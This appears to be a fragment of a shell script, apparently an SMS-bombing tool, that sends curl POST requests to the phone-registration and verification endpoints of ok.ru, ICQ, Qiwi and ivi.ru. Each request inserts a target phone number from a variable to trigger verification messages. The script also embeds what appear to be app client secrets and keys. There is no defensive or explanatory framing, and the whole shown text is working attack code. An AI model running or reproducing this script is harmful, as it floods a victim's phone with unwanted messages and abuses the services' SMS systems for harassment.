...
echo
progress
curl -s -X POST "https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone" --data-urlencode st.r.phone="+9$numara" > test
echo
...
echo
progress
curl -s -X POST https://www.icq.com/smsreg/requestPhoneValidation.php -d msisdn="+9$numara" -d locale="en" -d countryCode="tr" -d version="1"  -d k="ic1rtwz1s1Hj1O0r" -d r="46763" > test
...
echo
progress
curl -s -X POST https://mobile-api.qiwi.com/oauth/authorize -d response_type="urn:qiwi:oauth:response-type:confirmation-id" -d username="9$numara" -d client_id="android-qw" -d client_secret="zAm4FKq9UnSe7id" > test
...
echo
progress
curl -s -X POST https://api.ivi.ru/mobileapi/user/register/phone/v6/ -d phone="+9$numara" -d device="Windows+v.43+Chrome+v.7453451" -d app_version="870" > test
